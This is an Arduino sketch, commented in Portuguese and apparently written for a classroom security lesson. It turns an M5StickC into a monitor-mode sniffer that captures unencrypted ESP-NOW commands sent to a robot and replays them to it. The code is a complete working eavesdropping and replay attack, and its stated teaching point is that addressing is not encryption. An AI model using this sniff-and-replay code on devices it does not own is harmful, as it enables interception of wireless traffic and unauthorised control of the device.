// espiao_monitor.ino - ESPIAO em MODO MONITOR (promiscuo), M5StickC PlusSE.
//
// Por que Arduino/C e nao MicroPython:
//   O MicroPython (firmware UiFlow2) NAO expoe modo monitor/promiscuo. Quando o
//   controle passa a mandar UNICAST (controle_unicast.py), o radio de um espiao
//   ESP-NOW "normal" descarta tudo que nao e para o MAC dele -> a tela fica vazia.
//   Aqui usamos esp_wifi_set_promiscuous(): a placa le TODO frame 802.11 do canal,
//   inclusive o unicast endereçado ao robo. Licao: enderecar != cifrar. Um sniffer
//   em modo monitor le o ar inteiro; a confidencialidade so vem com criptografia.
//
// O que faz:
//   - captura frames ESP-NOW no CANAL e mostra o payload na tela (quebra de confidencialidade);
//   - botao A = REPLAY (reenvia por ESP-NOW unicast o item selecionado ao robo);
//   - botao B = move a selecao no historico.
//   Mesma pedagogia do espiao.py, agora capturando unicast.
//
// Requisitos (Arduino IDE / PlatformIO):
//   - Placa: um M5Stack ESP32 (ex. "M5StickCPlus2"); o M5Unified detecta o PlusSE em runtime.
//   - Biblioteca: M5Unified (Gerenciador de Bibliotecas). Core: esp32 by Espressif.
//   Veja README.md desta pasta.

#include <M5Unified.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_now.h"

// ====================== CONFIGURACAO ======================
static const uint8_t CANAL = 1;               // mesmo canal de todas as placas

// MAC do ROBO: destino do unicast do controle e do replay deste espiao.
// Descubra com: mpremote connect <porta-robo> run micropython/ferramentas/mostra_mac.py
// Preencha os 6 bytes abaixo (troque os zeros):
static uint8_t ROBO_MAC[6] = { 0x48, 0x27, 0xe2, 0xe3, 0xac, 0x78 };

#define HIST_MAX 8                            // quantos comandos a tela guarda
#define BODY_MAX 32                           // bytes de payload que guardamos por item
// ==========================================================

static const uint8_t BROADCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

// ---------- Fila do callback (promiscuo) para o loop() ----------
// O callback roda em contexto sensivel: so copia os bytes e sai. Desenho e no loop().
struct Cap {
  uint8_t src[6];
  uint8_t body[BODY_MAX];
  uint8_t len;
};
#define QN 16
static volatile uint8_t q_head = 0, q_tail = 0;
static Cap q[QN];

// ---------- Historico mostrado na tela ----------
static Cap   hist[HIST_MAX];
static int   hist_n = 0;         // quantos itens no historico
static long  total  = 0;         // total de frames capturados
static int   sel    = 0;         // item selecionado (para replay)
static String rodape = "A=replay B=sel";
static uint16_t rodape_cor;

// ---------- Nome legivel do comando ----------
static String nomeComando(const Cap& c) {
  if (c.len == 1) {
    switch (c.body[0]) {
      case 'F': return "FRENTE";
      case 'T': return "TRAS";
      case 'E': return "ESQ";
      case 'D': return "DIR";
      case 'P': return "PARAR";
    }
  }
  // Payload generico: mostra como texto imprimivel ou hex.
  String s;
  bool printable = true;
  for (int i = 0; i < c.len; i++) {
    if (c.body[i] < 32 || c.body[i] > 126) { printable = false; break; }
  }
  if (printable) {
    for (int i = 0; i < c.len; i++) s += (char)c.body[i];
  } else {
    char hx[4];
    for (int i = 0; i < c.len && i < 6; i++) { sprintf(hx, "%02X", c.body[i]); s += hx; }
  }
  return s;
}

// ---------- Callback do modo promiscuo ----------
// Layout de um frame ESP-NOW no ar (action frame vendor-specific):
//   [0..23]  cabecalho 802.11 (addr1=DA em 4..9, addr2=SA em 10..15)
//   [24]     category = 0x7F (vendor-specific action)
//   [25..27] OUI 18:FE:34   [28..31] valor aleatorio
//   [32]     element id = 0xDD   [33] length
//   [34..36] OUI 18:FE:34   [37] type = 0x04 (ESP-NOW)   [38] versao
//   [39..]   payload (o nosso "F"/"T"/"P")
static void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 40) return;

  // Confere a assinatura ESP-NOW (element vendor-specific).
  if (p[24] != 0x7F) return;
  if (p[32] != 0xDD) return;
  if (p[34] != 0x18 || p[35] != 0xFE || p[36] != 0x34) return;
  if (p[37] != 0x04) return;

  const uint8_t* da = p + 4;      // destino (addr1)

  // Foca no trafego enderecado ao robo (unicast) ou em broadcast.
  bool para_robo = (memcmp(da, ROBO_MAC, 6) == 0);
  bool bcast     = (memcmp(da, BROADCAST, 6) == 0);
  if (!para_robo && !bcast) return;

  int bodylen = p[33] - 5;        // length cobre OUI(3)+type(1)+versao(1)+body
  if (bodylen < 1) return;
  if (39 + bodylen > len) bodylen = len - 39;
  if (bodylen > BODY_MAX) bodylen = BODY_MAX;

  // Enfileira (nunca bloqueia; descarta se cheio).
  uint8_t next = (q_head + 1) % QN;
  if (next == q_tail) return;
  memcpy(q[q_head].src, p + 10, 6);      // origem (addr2)
  memcpy(q[q_head].body, p + 39, bodylen);
  q[q_head].len = bodylen;
  q_head = next;
}

// ---------- Desenho ----------
static void desenhar() {
  auto& d = M5.Display;
  d.fillScreen(TFT_BLACK);
  d.setTextColor(TFT_ORANGE, TFT_BLACK);
  d.setTextDatum(top_center);
  d.setTextSize(2);
  d.drawString("ESPIAO", d.width() / 2, 2);
  d.setTextSize(1);
  d.setTextColor(TFT_WHITE, TFT_BLACK);
  d.drawString("monitor", d.width() / 2, 20);
  d.drawString("cap: " + String(total), d.width() / 2, 32);

  if (hist_n == 0) {
    d.drawString("ouvindo...", d.width() / 2, 90);
  } else {
    // Ultimo comando, grande.
    d.setTextSize(2);
    d.setTextColor(TFT_ORANGE, TFT_BLACK);
    String ult = nomeComando(hist[hist_n - 1]);
    if (ult.length() > 6) ult = ult.substring(0, 6);
    d.drawString(ult, d.width() / 2, 50);

    // Lista do historico; ">" marca o alvo do replay.
    d.setTextSize(1);
    d.setTextDatum(top_left);
    int y = 80;
    for (int i = 0; i < hist_n; i++) {
      String marca = (i == sel) ? ">" : " ";
      String linha = marca + " " + nomeComando(hist[i]);
      if (linha.length() > 16) linha = linha.substring(0, 16);
      d.setTextColor(i == sel ? TFT_GREEN : TFT_WHITE, TFT_BLACK);
      d.drawString(linha, 2, y);
      y += 12;
    }
    d.setTextDatum(top_center);
  }

  d.setTextColor(rodape_cor, TFT_BLACK);
  d.drawString(rodape, d.width() / 2, d.height() - 12);
}

// ---------- Acoes dos botoes ----------
static void registrar(const Cap& c) {
  total++;
  if (hist_n < HIST_MAX) {
    hist[hist_n++] = c;
  } else {
    for (int i = 1; i < HIST_MAX; i++) hist[i - 1] = hist[i];
    hist[HIST_MAX - 1] = c;
  }
  sel = hist_n - 1;              // seleciona o mais recente ao capturar
}

static void enviarReplay() {
  if (hist_n == 0) return;
  const Cap& c = hist[sel];
  esp_err_t r = esp_now_send(ROBO_MAC, c.body, c.len);
  rodape = (r == ESP_OK) ? ("REPLAY: " + nomeComando(c)) : "replay falhou";
  if (rodape.length() > 16) rodape = rodape.substring(0, 16);
  rodape_cor = TFT_GREEN;
}

static void moverSelecao() {
  if (hist_n == 0) return;
  sel = (sel + 1) % hist_n;
  rodape = "A=replay B=sel";
  rodape_cor = TFT_WHITE;
}

// ---------- Setup ----------
void setup() {
  auto cfg = M5.config();
  M5.begin(cfg);
  M5.Display.setRotation(0);
  rodape_cor = TFT_WHITE;

  // WiFi em STA (sem conectar) para ter o radio ativo no canal certo.
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_channel(CANAL, WIFI_SECOND_CHAN_NONE);

  // ESP-NOW para poder ENVIAR o replay (so precisa registrar o peer de destino).
  if (esp_now_init() == ESP_OK) {
    esp_now_peer_info_t peer = {};
    memcpy(peer.peer_addr, ROBO_MAC, 6);
    peer.channel = CANAL;
    peer.ifidx   = WIFI_IF_STA;
    peer.encrypt = false;
    esp_now_add_peer(&peer);
  }

  // Modo monitor: le todo frame de gerenciamento (ESP-NOW e action frame).
  wifi_promiscuous_filter_t filtro = {};
  filtro.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filtro);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous(true);
  // Reforca o canal depois de ligar o promiscuo.
  esp_wifi_set_channel(CANAL, WIFI_SECOND_CHAN_NONE);

  desenhar();
}

// ---------- Loop ----------
void loop() {
  M5.update();

  // Consome o que o callback capturou.
  bool mudou = false;
  while (q_tail != q_head) {
    registrar(q[q_tail]);
    q_tail = (q_tail + 1) % QN;
    mudou = true;
  }

  if (M5.BtnA.wasPressed()) { enviarReplay(); mudou = true; }
  if (M5.BtnB.wasPressed()) { moverSelecao(); mudou = true; }

  if (mudou) desenhar();
  delay(15);
}
